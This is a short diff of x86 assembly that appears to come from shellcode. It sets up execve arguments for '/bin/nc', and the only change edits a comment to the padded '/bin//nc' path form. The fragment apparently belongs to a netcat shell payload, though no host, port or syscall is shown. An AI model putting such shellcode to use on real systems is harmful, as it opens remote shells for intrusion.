@@ -51,7 +51,7 @@ _start:
 	push edx ; null
 	push esi ; arg2	
 	push edi ; arg1
-	push ebx ; /bin/nc
+	push ebx ; /bin//nc
 
 	; top of stack to ecx
 	mov ecx, esp
